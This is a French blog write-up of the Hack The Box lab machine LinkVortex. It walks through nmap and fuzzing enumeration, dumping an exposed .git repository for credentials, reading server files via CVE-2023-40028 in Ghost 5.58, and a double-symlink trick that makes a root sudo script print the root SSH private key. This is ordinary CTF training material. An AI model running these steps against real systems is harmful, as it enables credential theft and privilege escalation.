---
date: 2025-04-11T22:37:01-05:00
# description: ""
image: "/images/HTB-LinkVortex/LinkVortex"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: LinkVortex"
type: "post"
---

* Platforme: Hack The Box
* Lien: [LinkVortex](https://app.hackthebox.com/machines/LinkVortex)
* Niveau: Facile
* OS: Linux
---

LinkVortex utilise une version vulnérable de Ghost CMS. Nous trouvons un répertoire caché hébergeant une page de connexion pour l'administrateur Ghost, ainsi qu'un répertoire `.git` exposé. Ce dernier contient des identifiants valides pour la page admin. Nous exploitons ensuite le `CVE-2023-40028`, une vulnérabilité de lecture de fichiers, pour lire des fichiers sensibles sur le serveur, et trouvons des identifiants supplémentaires. Ces derniers nous permettent d'obtenir un accès initial via SSH. L'escalade des privilèges est réalisée en exploitant un script exécutable en tant que root. 

## Balayage

```
nmap -sC -sV {TARGET_IP}
```

**Résultats**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 09:42 CST
Nmap scan report for 10.129.231.194
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)

80/tcp open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Did not follow redirect to http://linkvortex.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.71 seconds
```

Nmap trouve deux ports ouverts: `22` pour SSH et `80` pour http. De plus, il y a une redirection vers `linkvortex.htb`.

```
sudo echo "{TARGET_IP} linkvortex.htb" | sudo tee -a /etc/hosts
```

## Enumération

À `http://linkvortex.htb/`, nous trouvons un blog utilisant le système de gestion de contenu [Ghost CMS](https://ghost.org/). Wappalyzer nous indique que la `version 5.58` est utilisée. 

![LinkVortex website](/images/HTB-LinkVortex/linkvortex_website.png)

Avec feroxbuster, nous trouvons `/ghost`.

```
feroxbuster -u http://linkvortex.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 200 -r --scan-dir-listings -C 403,404
```

![ghost hidden directory](/images/HTB-LinkVortex/ghost_directory.png)

En visitant `http://linkvortex.htb/ghost/`, nous arrivons sur une page de connexion admin.

![ghost admin page](/images/HTB-LinkVortex/ghost_admin_page.png)

En énumérant les sous-domaines, nous découvrons le sous-domaine `dev`.

```
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://linkvortex.htb -H "Host: FUZZ.linkvortex.htb" -ic -fs 230
```

![dev subdomain found](/images/HTB-LinkVortex/subdomain_dev.png)

`http://dev.linkvortex.htb/` mène à un autre site web qui est en construction.

![website at dev subdomain](/images/HTB-LinkVortex/dev_subdomain_website.png)

Nous trouvons également un répertoire caché (`.git`) pour le sous-domaine.

```
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://dev.linkvortex.htb/FUZZ -ic --fc 404,403
```

![git hidden folder](/images/HTB-LinkVortex/subdomain_git.png)

En visitant `http://dev.linkvortex.htb/.git` nous trouvons des fichiers pour un dépôt git.

![git files](/images/HTB-LinkVortex/linkvortex_git_files.png)

Nous téléchargeons le dépôt disponible à `http://dev.linkvortex.htb/.git` avec [git-dumper](https://github.com/arthaud/git-dumper).

```
git-dumper http://dev.linkvortex.htb/.git git_linkvortex
```

![git dumper command](/images/HTB-LinkVortex/git_dumper_linkvortex.png)

A l'intérieur du répertoire, nous recherchons des informations d'identification, en utilisant `grep -iR "password"`. Quelques possibilités de mot de passe sont découvertes.

![passwords found in project files](/images/HTB-LinkVortex/passwords_found.png)

Nous pouvons nous connecter sur `http://linkvortex.htb/ghost` avec `admin@linkvortex.htb:OctopiFociPilfer45` et accéder au tableau de bord de Ghost.

![Ghost Dashboard](/images/HTB-LinkVortex/ghost_dashboard.png)

## Accès initial

Maintenant que nous détenons des identifiants valides, nous pouvons utiliser ce [PoC](https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028) pour `CVE-2023-40028` afin de lire des fichiers sur le système cible.

![CVE-2023-40028](/images/HTB-LinkVortex/CVE-2023-40028.png)

Parmi les fichiers du dépôt, il y en a un appelé `Dockerfile.ghost`, en vérifiant son contenu nous trouvons un fichier de configuration à `/var/lib/ghost/config.production.json`.

En utilisant notre vulnérabilité de lecture de fichier, nous lisons `/var/lib/ghost/config.production.json` et trouvons les identifiants d'un autre utilisateur.

![Dockerfile config](/images/HTB-LinkVortex/creds_docker_config.png)

```
bob@linkvortex.htb:fibber-talented-worth
```

Nous nous connectons via SSH en tant que `bob` et pouvons lire le drapeau de l'utilisateur.

![user flag](/images/HTB-LinkVortex/user_flag.png)

## Elévation de Privilèges

Nous consultons les privilèges sudo de l'utilisateur et constatons qu'il peut exécuter `/usr/bin/bash /opt/ghost/clean_symlink.sh *.png` en tant que n'importe quel utilisateur, sans fournir de mot de passe.

![sudo privileges for bob](/images/HTB-LinkVortex/sudo_privs_linkvortex.png)

Le contenu de `/opt/ghost/clean_symlink.sh` est le suivant

```bash
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```

Le script `clean_symlink.sh` est conçu pour gérer les liens symboliques ciblant les fichiers `.png`. Il vérifie si le fichier fourni est un lien symbolique et, si c'est le cas, détermine son chemin cible. Si le lien symbolique pointe vers un répertoire sensible tel que `/etc` ou `/root`, le script le supprime. Sinon, il déplace le lien symbolique vers un répertoire de quarantaine (`/var/quarantined/`). De plus, lorsque la variable d'environnement `CHECK_CONTENT=true` est définie, le script tente de lire et d'afficher le contenu du fichier (ou du fichier vers lequel pointe le lien symbolique).

Nous pouvons essayer d'exploiter le script avec un lien symbolique pointant vers la clé SSH root.

```
touch id_rsa.png
ln -sf /root/.ssh/id_rsa id_rsa.png
sudo /usr/bin/bash /opt/ghost/clean_symlink.sh id_rsa.png
```

Le lien est en effet supprimé.

![Symlink exploit failure](/images/HTB-LinkVortex/symlink_exploit_fail.png)

Essayons une autre méthode. Cette fois-ci, nous utiliserons deux liens symboliques afin de contourner la fonction de sécurité du script.

```
cd ~
ln -s /root/.ssh/id_rsa id_rsa.txt
ln -s /home/bob/id_rsa.txt root.png
sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/root.png
```

![root privilege escalation](/images/HTB-LinkVortex/root_exploitation.png)

Nous exploitons avec succès le script et obtenons la clé SSH de l'utilisateur root. Nous sauvegardons la clé privée SSH récupérée et l'utilisons pour nous authentifier en tant qu'utilisateur root.

![root flag](/images/HTB-LinkVortex/root_flag.png)

### Explication de l'exploitation

Le script détecte `root.png` comme un fichier valide correspondant au modèle `*.png`. Cependant, `root.png` est un lien symbolique vers `id_rsa.txt`, qui est lui-même un lien symbolique vers `/root/.ssh/id_rsa`.

Puisque `CHECK_CONTENT=true`, le script affiche le contenu du fichier vers lequel pointe notre lien symbolique. Puisque le script s'exécute avec les privilèges de root, il suit avec succès les deux liens symboliques et finit par lire le contenu de `/root/.ssh/id_rsa`.


